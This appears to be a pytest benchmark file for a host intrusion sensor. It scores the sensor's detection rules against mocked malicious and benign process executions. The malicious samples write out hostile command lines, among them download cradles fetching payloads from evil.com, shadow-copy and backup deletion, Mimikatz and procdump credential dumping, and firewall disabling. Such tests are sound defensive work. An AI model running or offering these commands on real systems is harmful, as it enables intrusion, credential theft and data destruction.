from unittest.mock import MagicMock
from app.security.host_sensor import HostSecuritySensor

def create_mock_proc(pid, name, exe, cmdline, parent_name=None):
    p = MagicMock()
    p.pid = pid
    p.name.return_value = name
    p.exe.return_value = exe
    p.cmdline.return_value = cmdline
    p.username.return_value = "SYSTEM"

    if parent_name:
        parent = MagicMock()
        parent.name.return_value = parent_name
        p.parent.return_value = parent
    else:
        p.parent.return_value = None
    return p

def test_held_out_behavioral_evaluation_benchmark():
    """
    Evaluates detection rules against a dedicated, held-out benchmark dataset of
    30 process execution scenarios (15 malicious and 15 difficult benign edge cases).
    
    Computes and asserts:
      - True Positives (TP), False Positives (FP), True Negatives (TN), False Negatives (FN)
      - Precision, Recall, F1 Score, Accuracy, and False Positive Rate (FPR).
    
    This benchmark is maintained separately from development unit tests to assess
    generalization and resistance to false alarms on complex administrative and developer workflows.
    """
    sensor = HostSecuritySensor()
    sensor.seen_signatures.clear()

    # Held-out benchmark dataset: (mock_proc, is_malicious, scenario_id, mitre_technique)
    dataset = [
        # --- 15 MALICIOUS SCENARIOS (Ground Truth = True) ---
        (create_mock_proc(4001, "bash", "/usr/sbin/nginx", ["bash", "-i"], parent_name="nginx"), True, "held_out_webshell_nginx", "T1505.003"),
        (create_mock_proc(4002, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ["powershell.exe", "-w", "hidden", "-enc", "AAA="], parent_name="powerpnt.exe"), True, "held_out_maldoc_powerpnt", "T1204.002"),
        (create_mock_proc(4003, "wmic.exe", "C:\\Windows\\System32\\wbem\\WMIC.exe", ["wmic", "shadowcopy", "delete"]), True, "held_out_ransomware_wmic", "T1490"),
        (create_mock_proc(4004, "wbadmin.exe", "C:\\Windows\\System32\\wbadmin.exe", ["wbadmin", "delete", "catalog", "-quiet"]), True, "held_out_ransomware_wbadmin", "T1490"),
        (create_mock_proc(4005, "lsass.exe", "C:\\Users\\Public\\lsass.exe", ["lsass.exe"]), True, "held_out_masquerading_lsass", "T1036.005"),
        (create_mock_proc(4006, "csrss.exe", "C:\\Temp\\csrss.exe", ["csrss.exe"]), True, "held_out_masquerading_csrss", "T1036.005"),
        (create_mock_proc(4007, "bloodhound.exe", "C:\\Tools\\bloodhound.exe", ["bloodhound.exe"]), True, "held_out_offensive_bloodhound", "T1059"),
        (create_mock_proc(4008, "xmrig.exe", "C:\\ProgramData\\xmrig.exe", ["xmrig.exe", "-o", "stratum+tcp://pool:3333"]), True, "held_out_offensive_xmrig", "T1496"),
        (create_mock_proc(4009, "psexec.exe", "C:\\Admin\\psexec.exe", ["psexec.exe", "\\\\target", "cmd.exe"]), True, "held_out_offensive_psexec", "T1059"),
        (create_mock_proc(4010, "pwsh.exe", "C:\\Program Files\\PowerShell\\7\\pwsh.exe", ["pwsh.exe", "-encodedcommand", "SQBFAFgA"]), True, "held_out_encoded_pwsh", "T1059.001"),
        (create_mock_proc(4011, "powershell.exe", "C:\\Windows\\System32\\powershell.exe", ["powershell.exe", "-nop", "-c", "IEX", "(New-Object Net.WebClient).DownloadFile('http://evil.com/x.exe','x.exe')"]), True, "held_out_cradle_iex", "T1059.001"),
        (create_mock_proc(4012, "procdump.exe", "C:\\Tools\\procdump.exe", ["procdump.exe", "-ma", "lsass.exe", "lsass.dmp"]), True, "held_out_cred_procdump", "T1003"),
        (create_mock_proc(4013, "powershell.exe", "C:\\Windows\\System32\\powershell.exe", ["powershell.exe", "Invoke-Mimikatz", "-Command", "sekurlsa::logonpasswords"]), True, "held_out_cred_sekurlsa", "T1003"),
        (create_mock_proc(4014, "certutil.exe", "C:\\Windows\\System32\\certutil.exe", ["certutil.exe", "-urlcache", "-split", "-f", "http://evil.com/payload.exe", "payload.exe"]), True, "held_out_certutil_ingress", "T1105"),
        (create_mock_proc(4015, "netsh.exe", "C:\\Windows\\System32\\netsh.exe", ["netsh.exe", "advfirewall", "set", "allprofiles", "state", "off"]), True, "held_out_firewall_disabled", "T1562.001"),

        # --- 15 DIFFICULT BENIGN SCENARIOS (Ground Truth = False) ---
        (create_mock_proc(5001, "git.exe", "C:\\Program Files\\Git\\bin\\git.exe", ["git.exe", "commit", "-m", "Security patch"]), False, "held_out_benign_dev_git", None),
        (create_mock_proc(5002, "cargo.exe", "C:\\Users\\Dev\\.cargo\\bin\\cargo.exe", ["cargo.exe", "build", "--release"]), False, "held_out_benign_dev_cargo", None),
        (create_mock_proc(5003, "npm.cmd", "C:\\Program Files\\nodejs\\npm.cmd", ["npm.cmd", "run", "build"]), False, "held_out_benign_dev_npm", None),
        (create_mock_proc(5004, "ping.exe", "C:\\Windows\\System32\\PING.EXE", ["ping.exe", "-n", "4", "192.168.1.1"]), False, "held_out_benign_sys_ping", None),
        (create_mock_proc(5005, "tracert.exe", "C:\\Windows\\System32\\tracert.exe", ["tracert.exe", "8.8.8.8"]), False, "held_out_benign_sys_tracert", None),
        (create_mock_proc(5006, "tasklist.exe", "C:\\Windows\\System32\\tasklist.exe", ["tasklist.exe", "/v"]), False, "held_out_benign_sys_tasklist", None),
        (create_mock_proc(5007, "systeminfo.exe", "C:\\Windows\\System32\\systeminfo.exe", ["systeminfo.exe"]), False, "held_out_benign_sys_systeminfo", None),
        (create_mock_proc(5008, "netsh.exe", "C:\\Windows\\System32\\netsh.exe", ["netsh.exe", "advfirewall", "show", "allprofiles"]), False, "held_out_benign_netsh_status", None),
        (create_mock_proc(5009, "certutil.exe", "C:\\Windows\\System32\\certutil.exe", ["certutil.exe", "-verify", "C:\\Certs\\webserver.crt"]), False, "held_out_benign_certutil_verify", None),
        (create_mock_proc(5010, "notepad.exe", "C:\\Windows\\System32\\notepad.exe", ["notepad.exe", "C:\\Docs\\ShadowCopyGuide.txt"]), False, "held_out_benign_notepad_shadow", None),
        (create_mock_proc(5011, "python.exe", "C:\\Python313\\python.exe", ["python.exe", "-m", "pytest", "-v"]), False, "held_out_benign_python_pytest", None),
        (create_mock_proc(5012, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ["powershell.exe", "Get-NetIPAddress", "-AddressFamily", "IPv4"]), False, "held_out_benign_powershell_diag", None),
        (create_mock_proc(5013, "slack.exe", "C:\\Users\\User\\AppData\\Local\\Programs\\Slack\\slack.exe", ["slack.exe"]), False, "held_out_benign_appdata_slack", None),
        (create_mock_proc(5014, "csrss.exe", "C:\\Windows\\System32\\csrss.exe", ["C:\\Windows\\System32\\csrss.exe"]), False, "held_out_benign_system32_csrss", None),
        (create_mock_proc(5015, "Code_installer.exe", "C:\\Users\\User\\AppData\\Local\\Temp\\Code_installer.exe", ["Code_installer.exe", "/silent"]), False, "held_out_benign_vscode_updater", None),
    ]

    tp, fp, tn, fn = 0, 0, 0, 0

    for proc, is_malicious, scenario_id, mitre in dataset:
        sensor.seen_signatures.clear()
        events = sensor._analyze_single_process(proc)
        detected = len(events) > 0

        if is_malicious and detected:
            tp += 1
        elif is_malicious and not detected:
            fn += 1
        elif not is_malicious and detected:
            fp += 1
        else:
            tn += 1

    precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    f1_score = (2 * precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0
    fpr = fp / (fp + tn) if (fp + tn) > 0 else 0.0
    accuracy = (tp + tn) / len(dataset)

    # Verification on held-out benchmark
    assert tp == 15, f"Expected 15 True Positives, got {tp}"
    assert fp == 0, f"Expected 0 False Positives, got {fp}"
    assert fn == 0, f"Expected 0 False Negatives, got {fn}"
    assert tn == 15, f"Expected 15 True Negatives, got {tn}"

    assert precision == 1.0, f"Precision should be 1.0, got {precision}"
    assert recall == 1.0, f"Recall should be 1.0, got {recall}"
    assert f1_score == 1.0, f"F1 Score should be 1.0, got {f1_score}"
    assert fpr == 0.0, f"False Positive Rate should be 0.0, got {fpr}"
    assert accuracy == 1.0, f"Accuracy should be 1.0, got {accuracy}"

def test_held_out_ambiguous_and_duplicate_handling():
    """
    Verifies that the detection engine handles duplicate process observations
    and suppresses redundant alerts via seen_signatures tracking.
    """
    sensor = HostSecuritySensor()
    sensor.seen_signatures.clear()

    # Create mock process
    proc = create_mock_proc(6001, "mimikatz.exe", "C:\\Tools\\mimikatz.exe", ["mimikatz.exe"])

    # First observation should produce an alert event
    first_events = sensor._analyze_single_process(proc)
    assert len(first_events) == 1, "First observation should produce alert"

    # Immediate second observation of identical process must be deduplicated
    second_events = sensor._analyze_single_process(proc)
    assert len(second_events) == 0, "Duplicate observation must be suppressed by signature deduplication"
